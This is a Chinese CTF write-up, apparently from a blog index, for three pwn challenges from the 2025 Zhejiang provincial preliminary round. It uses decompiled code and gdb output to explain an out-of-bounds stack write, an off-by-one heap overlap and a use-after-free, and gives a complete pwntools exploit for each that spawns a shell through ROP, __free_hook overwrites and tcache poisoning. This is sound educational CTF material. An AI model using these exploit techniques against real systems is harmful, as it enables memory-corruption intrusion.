[{"title":"2025浙江省省赛-初赛-wp","url":"/2025/11/10/2025%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B-%E5%88%9D%E8%B5%9B-wp/","content":"题目链接https://github.com/yfor-yfor/-/tree/main/2025%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B-%E5%88%9D%E8%B5%9B\n\nrop题目分析有input和output两个函数，函数的参数是s\n对s构造如下结构体后方便分析,由一个数组和一个变量index组成\nstruct arr&#123;__int64 arr[9]; __int64 index;&#125;;\n\ninput\nunsigned __int64 __fastcall input(arr *s)&#123;  __int64 index; // [rsp+18h] [rbp-38h]  char sa[40]; // [rsp+20h] [rbp-30h] BYREF  unsigned __int64 canary; // [rsp+48h] [rbp-8h]  canary = __readfsqword(0x28u);  index = s-&gt;index;  if ( index &lt;= 9 )  &#123;    puts(&quot;input your number:&quot;);    fgets(sa, 24, stdin);    s-&gt;arr[index] = atoll(sa);    ++s-&gt;index;  &#125;  else  &#123;    puts(&quot;input error&quot;);  &#125;  return __readfsqword(0x28u) ^ canary;&#125;\n\n漏洞点在于，当我们input8次后，s-&gt;index变成9，此时输入的number会写到s-&gt;index里，这时候我们就可以控制下次读入的位置了\n而if的检查只检查上限，因此可以令s-&gt;index为一个负数值来修改负数下标处的内容\n而s结构体的地址在main函数的栈帧上，因此我们有了在栈上任意写的能力\noutput\nunsigned __int64 __fastcall output(arr *s)&#123;  __int64 index; // [rsp+10h] [rbp-10h] BYREF  unsigned __int64 canary; // [rsp+18h] [rbp-8h]  canary = __readfsqword(0x28u);  puts(&quot;index:&quot;);  __isoc99_scanf(&quot;%lld&quot;, &amp;index);  getchar();  if ( index &lt;= 9 )  &#123;    puts(&quot;your number:&quot;);    printf(&quot;%lld\\n&quot;, s-&gt;arr[index]);    s-&gt;arr[index] = 0LL;    --s-&gt;index;  &#125;  else  &#123;    puts(&quot;output error&quot;);  &#125;  return __readfsqword(0x28u) ^ canary;&#125;\n\noutput也同样不检查index的下限，根据之前分析的可知，s在栈上，只要我们输入一个&lt;&#x3D;9的值，就可以泄露低地址处栈上的值，比如libc\n攻击思路实际的攻击更加简单，都不用覆写index\ngdb调试input的内容可以发现\npwndbg&gt; tele 0x7fffffffde00  1500:0000│-070     0x7fffffffde00 —▸ 0x401190 ◂— endbr64 01:0008│ rsp     0x7fffffffde08 —▸ 0x401523 ◂— jmp 0x4014cc //返回地址02:0010│ rax rdi 0x7fffffffde10 ◂— 0                        //s-&gt;arr[0]... ↓            9 skipped                                  //s-&gt;arr[1~8]&amp;s-&gt;index 0c:0060│-010     0x7fffffffde60 —▸ 0x7fffffffdf60 ◂— 10d:0068│-008     0x7fffffffde68 ◂— 0xab2679a5e8c33c000e:0070│ rbp     0x7fffffffde70 ◂— 0pwndbg&gt; x $rdi0x7fffffffde10:\t0x00000000\n\n也就是我们可以直接在返回地址附近写入攻击内容\n先通过output泄露libc\n再开始input的布置，由于output会让index-1，此时修改的位置就是返回地址，所以把返回地址的值复原回去\n之后我们就可以布置返回地址后方的攻击链了\n也就是从arr[0]开始，理论上来说应该是\narr[0]:sharr[1]:retarr[2]:system\n\n此时再通过多次output，令index&#x3D;-1\n写入arr[-1]:pop_rdi_ret 即劫持返回地址来触发完整攻击链\n不过后续发现，output会把arr[0]清零，但是也很好处理，如下布置即可：\narr[-1]:pop_rdi_retarr[0]:0arr[1]:pop_rdiarr[2]:sharr[3]:retarr[4]:system\n\nexpfrom pwn import *context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)io=process(&#x27;./pwn&#x27;)libc=ELF(&#x27;./libc.so.6&#x27;)def dbg():    gdb.attach(io)    pause()def cmd(choice):    io.recvuntil(b&#x27;&gt;&gt;&#x27;)    io.sendline(str(choice).encode())def input(data):    cmd(1)    io.recvuntil(b&#x27;input your number:&#x27;)    io.sendline(str(data))def output(index):    cmd(2)    io.recvuntil(b&#x27;index:&#x27;)    io.sendline(str(index))output(-13)io.recvuntil(b&#x27;your number:\\n&#x27;)libc_base=int(io.recv(15))-0x8459ainfo(&quot;libc_base: &quot;+hex(libc_base))system=libc_base+libc.sym[&#x27;system&#x27;]sh=libc_base+next(libc.search(b&#x27;/bin/sh\\x00&#x27;),)pop_rdi=libc_base+next(libc.search(asm(&#x27;pop rdi;ret&#x27;),executable=True))ret=libc_base+next(libc.search(asm(&#x27;ret;&#x27;),executable=True))input(0x401523)#dbg()input(0)input(pop_rdi)input(sh)input(ret)input(system)for i in range(6):    output(0)input(pop_rdi)io.interactive()\n\n\n\none题目分析开头有一个简单的检验，伪随机数绕过即可\nint login()&#123;  unsigned int seed; // eax  int v2; // [rsp+0h] [rbp-10h]  int v3; // [rsp+4h] [rbp-Ch]  seed = time(0LL);  srand(seed);  v2 = rand() % 200;  v3 = rand() % 100;  puts(&quot;Let me know if u are not a rebot.&quot;);  printf(&quot;%d+%d=?\\n&quot;, v2, v3);  if ( v2 + v3 != (unsigned int)readint() )  &#123;    puts(&quot;Get out robot&quot;);    exit(1);  &#125;  return puts(&quot;Go on!&quot;);&#125;\n\n接下来是四个交互都有的常规堆，漏洞点在edit\nunsigned __int64 edit()&#123;  signed int n8; // [rsp+4h] [rbp-Ch] BYREF  unsigned __int64 v2; // [rsp+8h] [rbp-8h]  v2 = __readfsqword(0x28u);  puts(&quot;which one?&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;n8);  if ( (unsigned int)n8 &gt; 8 || !*((_QWORD *)&amp;clist + n8) )  &#123;    puts(&quot;sorry&quot;);    exit(1);  &#125;  puts(&quot;what to change?&quot;);  read(0, *((void **)&amp;clist + n8), slist[n8] + 1);  puts(&quot;Finish!&quot;);  return __readfsqword(0x28u) ^ v2;&#125;\n\n非常明显的off-by-one\n而且是2.31版本，检查不多，直接选择造成堆块复用然后打free_hook即可\n麻烦的是题目没给版本，不过简单的测试一下回显的结果，就能确定libc的版本范围了\n最后使用的是2.27-3ubuntu1.6_amd64这个版本的\nexpfrom pwn import *from ctypes import *context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)io=process(&#x27;./pwn&#x27;)lib=CDLL(&#x27;./libc-2.27.so&#x27;)libc=ELF(&#x27;./libc-2.27.so&#x27;)def init():    time=lib.time(0)     lib.srand(time)    io.recvuntil(b&#x27;?\\n&#x27;)    io.sendline(str(lib.rand()%200+lib.rand()%100).encode())def dbg():    gdb.attach(io)    pause()def cmd(choice):    io.recvuntil(b&#x27;5.exit\\n&#x27;)    io.sendline(str(choice).encode())def add(index,size,data):    cmd(1)    io.recvuntil(b&#x27;the index of command?\\n&#x27;)    io.sendline(str(index).encode())    io.recvuntil(b&#x27;the size of command?\\n&#x27;)    io.sendline(str(size).encode())    io.recvuntil(b&#x27;the command?\\n&#x27;)    io.send(data)def delete(index):    cmd(2)    io.recvuntil(b&#x27;which one?\\n&#x27;)    io.sendline(str(index).encode())def edit(index,data):    cmd(4)    io.recvuntil(b&#x27;which one?\\n&#x27;)    io.sendline(str(index).encode())    io.recvuntil(b&#x27;what to change?\\n&#x27;)    io.send(data)def show(index):    cmd(3)    io.recvuntil(b&#x27;which one?\\n&#x27;)    io.sendline(str(index).encode())init()add(0,0x430,b&#x27;aaaa&#x27;)add(1,0x20,b&#x27;aaaa&#x27;)delete(0)add(0,0x20,b&#x27;aaaaaaaa&#x27;)show(0)libc_base=u64(io.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(0x8,b&#x27;\\x00&#x27;))-0x3ec0a0info(hex(libc_base))free_hook=libc_base+libc.sym[&#x27;__free_hook&#x27;]add(2,0x400,b&#x27;aaaa&#x27;)add(3,0x38,b&#x27;aaa&#x27;)add(4,0x38,b&#x27;aaa&#x27;)add(5,0x38,b&#x27;aaa&#x27;)edit(3,b&#x27;a&#x27;*(0x38)+p8(0x81))delete(3)delete(4)add(4,0x78,b&#x27;aaa&#x27;)delete(5)edit(4,b&#x27;a&#x27;*(0x38)+p64(0x41)+p64(free_hook))add(5,0x38,b&#x27;/bin/sh\\x00&#x27;)add(3,0x38,p64(libc_base+libc.sym[&#x27;system&#x27;]))delete(5)io.interactive()\n\n\n\nbad_heap题目分析有add，delete，show的2.35堆\nadd\n主要限制了堆块的大小&lt;&#x3D;0x400\n至于只能申请0x14个堆块倒是无所谓，因为并不检查哪些堆块是否正在使用，直接覆盖都可以\n唯一有意思的检查是，判断申请到的堆块是不是在libc范围内，是就exit，这个后续会提及应对方式\nunsigned __int64 add()&#123;  unsigned int n0x14_1; // ebx  unsigned int n0x14; // [rsp+0h] [rbp-20h] BYREF  _DWORD nbytes[5]; // [rsp+4h] [rbp-1Ch] BYREF  *(_QWORD *)&amp;nbytes[1] = __readfsqword(0x28u);  puts(&quot;input idx:&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;n0x14);  if ( n0x14 &gt;= 0x14 )    exit(0);  puts(&quot;input size:&quot;);  __isoc99_scanf(&quot;%d&quot;, nbytes);  if ( nbytes[0] &gt; 0x400u )    exit(0);  n0x14_1 = n0x14;  *((_QWORD *)&amp;list + 2 * (int)n0x14_1) = malloc(nbytes[0]);  if ( *((_QWORD *)&amp;list + 2 * (int)n0x14) &gt;= (unsigned __int64)libc_start    &amp;&amp; *((_QWORD *)&amp;list + 2 * (int)n0x14) &lt;= (unsigned __int64)libc_end )  &#123;    exit(0);  &#125;  dword_40A8[4 * n0x14] = nbytes[0];  puts(&quot;input content:&quot;);  read(0, *((void **)&amp;list + 2 * (int)n0x14), nbytes[0]);  return *(_QWORD *)&amp;nbytes[1] - __readfsqword(0x28u);&#125;\n\ndelete\n明显的uaf漏洞\nunsigned __int64 dele()&#123;  int v1; // [rsp+4h] [rbp-Ch] BYREF  unsigned __int64 v2; // [rsp+8h] [rbp-8h]  v2 = __readfsqword(0x28u);  puts(&quot;input idx:&quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;v1);  if ( *((_QWORD *)&amp;list + 2 * v1) )    free(*((void **)&amp;list + 2 * v1));  else    puts(&quot;no!&quot;);  return v2 - __readfsqword(0x28u);&#125;\n\nshow是常规流程\n攻击流程通过合理的排布堆块，让同一个chunck同时在unsortedbin和tcachebin中\n再通过unsortedbin的合理切割，使得可以修改某个tcachebin中chunck的fd，完成tacahce posion即可\n至于关于libc的检查不用担心，只是禁用了io\n仍然有两种打法：\n\n通过tls_dtor_list劫持exit，但是题目没给ld文件，断网环境下也没有自配这个对应小版本的ld文件所以并没有使用\n利用environ攻击栈上返回地址，后续exp采用的就是这个方法\n\n值得一提的是，environ地址与libc的关系\nbss上的判断变量：libc_base &amp; libc_end10:0080│  0x555555558080 —▸ 0x7ffff7c00000 ◂— 0x3010102464c457f11:0088│  0x555555558088 —▸ 0x7ffff7e1c000 ◂— 0vmmap0x7ffff7c00000     0x7ffff7c28000 r--p    28000      0 libc.so.60x7ffff7c28000     0x7ffff7dbd000 r-xp   195000  28000 libc.so.60x7ffff7dbd000     0x7ffff7e15000 r--p    58000 1bd000 libc.so.60x7ffff7e15000     0x7ffff7e16000 ---p     1000 215000 libc.so.60x7ffff7e16000     0x7ffff7e1a000 r--p     4000 215000 libc.so.60x7ffff7e1a000     0x7ffff7e1c000 rw-p     2000 219000 libc.so.60x7ffff7e1c000     0x7ffff7e29000 rw-p     d000      0 [anon_7ffff7e1c]0x7ffff7fb8000     0x7ffff7fbd000 rw-p     5000      0 [anon_7ffff7fb8]pwndbg&gt; p &amp;environ$1 = (char ***) 0x7ffff7ffe2d0 &lt;environ&gt;可以观察到，libc_base和libc_end确实对应了libc的起点终点，但是environ并不在这个范围内，而是在anon段所以完全可以利用\n\n\n\n我们需要先通过第一次poison申请到environ向前一点的内容，send发送覆盖到environ处即可\n然后用show，使得覆盖的垃圾数据连带environ中存储的栈地址也泄露即可\n之后再一次poison申请到栈上，攻击栈的返回地址为我们的攻击链即可\nfrom pwn import * context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;)#log_level=&#x27;debug&#x27;,io=process(&#x27;./pwn&#x27;)libc=ELF(&#x27;./libc.so.6&#x27;)def dbg():    gdb.attach(io)    pause()def cmd(choice):    io.recvuntil(b&#x27;inputs your choice:\\n&#x27;)    io.sendline(str(choice).encode())def add(index,size,data=b&#x27;aaaa&#x27;):    cmd(1)    io.recvuntil(b&#x27;input idx:\\n&#x27;)    io.sendline(str(index))    io.recvuntil(b&#x27;input size:\\n&#x27;)    io.sendline(str(size))    io.recvuntil(b&#x27;input content:\\n&#x27;)    io.send(data)def delete(index):    cmd(2)    io.recvuntil(b&#x27;input idx:\\n&#x27;)    io.sendline(str(index))def show(index):    cmd(3)    io.recvuntil(b&#x27;input idx:\\n&#x27;)    io.sendline(str(index))for i in range(10):    add(i,0x200)for i in range(7):    delete(i)show(0)key=u64(io.recv(5).ljust(8,b&#x27;\\x00&#x27;))info(&quot;key: &quot;+hex(key))delete(7)show(7)libc_base=u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))-0x21ace0info(&quot;libc_base: &quot;+hex(libc_base))stdout=libc_base+libc.sym[&#x27;_IO_2_1_stdout_&#x27;]info(&quot;stdout: &quot;+hex(stdout))environ=libc_base+libc.sym[&#x27;environ&#x27;]delete(8)add(0,0x200)delete(8)add(8,0x200)delete(8)add(7,0x220,b&#x27;a&#x27;*(0x200)+p64(0x210)*2+p64((environ-0x10)^(key+1)))add(8,0x200)add(10,0x200,b&#x27;a&#x27;*(0x10))show(10)io.recvuntil(b&#x27;a&#x27;*(0x10))stack=u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))info(&quot;stack: &quot;+hex(stack))delete(7)delete(8)add(7,0x220,b&#x27;a&#x27;*(0x200)+p64(0x210)*2+p64((stack-0x148)^(key+1)))add(8,0x200)dbg()payload=p64(0)payload+=p64(libc_base+next(libc.search(asm(&#x27;pop rdi;ret&#x27;),executable=True)))payload+=p64(libc_base+next(libc.search(b&#x27;/bin/sh\\x00&#x27;)))payload+=p64(libc_base+next(libc.search(asm(&#x27;ret;&#x27;),executable=True)))payload+=p64(libc_base+libc.sym[&#x27;system&#x27;])add(11,0x200,payload)io.interactive()\n\n","tags":["wp"]}]